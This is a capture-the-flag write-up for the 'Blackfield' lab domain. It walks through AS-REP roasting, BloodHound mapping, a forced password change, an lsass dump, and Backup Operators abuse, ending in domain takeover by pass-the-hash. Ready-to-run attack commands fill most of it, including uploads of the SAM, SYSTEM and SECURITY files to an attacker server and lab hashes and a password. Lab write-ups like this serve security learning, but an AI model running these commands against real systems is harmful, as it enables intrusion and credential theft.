#box #smbclient #kerbrute #asreproasting #impacket-GetNPUsers #BloodHound #bloodhound-python #ForceChangePassword #rpcclient #pypykatz #lsass #dump #BackupOperators #impacket-secretsdump #ntds_dit #pth 
1. On this machine we discover that we have access and can read a SMB share named `profiles$` with a NULL Session.
```sh
smbclient -N  //blackfield.local/profiles$
```
2. Within this null session we discover a list of folders inside `profiles$` very likely resembling the list of users of the given domain `blackfield.local`. We manage to add those users (approx. 300) to a list and then we use kerbrute to enumerate the existing ones.
```sh
kerbrute userenum -d blackfield.local --dc 10.129.229.17 users.txt
```
![[attachments/blackfield-1.png]]
3. We then add those users onto a list and try to check whether any of those is ASREPRoastable within `impacket-GetNPUsers` and within the `--usersfile` flag (without this flag it doesn't work!)
```sh
impacket-GetNPUsers -usersfile valid_users.txt -request -format hashcat -outputfile asrep.txt -dc-ip 10.129.229.17 'BLACKFIELD/'
```
4. We discover that the user `support` is ASREPRoastable and obtain the ASREP hash from that command. We proceed to give the hash to hashcat and retrieve the credentials for the user `support:#00^BlackKnight`
```sh
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```
5. We then spray this user on different services to check whether it can access any service but apparently it cannot. So we run bloodhound to get further information about the domain. Within bloodhound we discover that the user `support` has `ForceChangePassword` over the user `audit2020`
```sh
bloodhound-python -u 'support' -p '#00^BlackKnight' -ns 10.129.229.17 -d blackfield.local -c all
```
![[attachments/blackfield-2.png]]
6. We manage to change the password within `rpcclient` and finally gain control of `audit2020`
```sh
rpcclient -U "BLACKFIELD/support" blackfield.local
rpcclient $> setuserinfo2 audit2020 23 Test123!
```
7. We discover that the user `audit2020` has access to the `forensic` share of SMB
8. Inside the `forensic` share we discover a few zip files inside the `memory_analysis` folder. One in particular catches our attention `lsass.zip`. After unzipping it, we opt to retrieve the content of the dump with `pypykatz`
```sh
pypykatz lsa minidump lsass.DMP
```
9. After dumping the `lsass` we discover the hash of the user `svc_backup` 
![[attachments/blackfield-3.png]]
10. We use that hash to try authenticate with WinRM, succeeding.
```sh
evil-winrm -i blackfield.local -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```
11. We discover, through Bloodhound, that this user belongs to the `Backup Operators` group. This group is particularly sensible because there's an exploit that permits us to escalated from Backup Operator to Domain Administrator because, as a Backup Operator, we have the possibility to create a volume shadow copy and extract SYSTEM / SAM / SECURITY and `ntds.dit`. The exploit can be found here: https://github.com/G4sp4rCS/backup-operator-to-domain-admin-POC/tree/main
12. We download it on our end and then we transfer it on the target with curl and finally execute it:
```powershell
Import-Module .\backupToDA.ps1
```
![[attachments/blackfield-4.png]]
13. We can now transfer all the data on our machine. To do so, we'll use `PSUpload.ps1`
On the attacker we start a FTP Server
```sh
python3 -m venv myenv;source myenv/bin/activate
pip install uploadserver
python3 -m uploadserver
File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
We then download the content from the target to our machine
```powershell
Import-Module .\PSUpload.ps1
Invoke-FileUpload http://10.10.16.55:8000/upload -File C:\Users\svc_backup\Documents\SAM
Invoke-FileUpload http://10.10.16.55:8000/upload -File C:\Users\svc_backup\Documents\SYSTEM
Invoke-FileUpload http://10.10.16.55:8000/upload -File C:\Users\svc_backup\Documents\SECURITY
```
14. Finally, we can proceed to dump the hashes with `impacket-secretsdump`, retrieving the NTLM hash of `Administrator`
```sh
impacket-secretsdump -ntds ntds.dit -system SYSTEM -history LOCAL
```
![[attachments/blackfield-5.png]]
15. Finally, we can authenticate with `evil-winrm` with a Pass The Hash attack, obtaining Domain takeover
```sh
evil-winrm -i blackfield.local -u 'administrator' -H '184fb5e5178480be64824d4cd53b99ee'
```
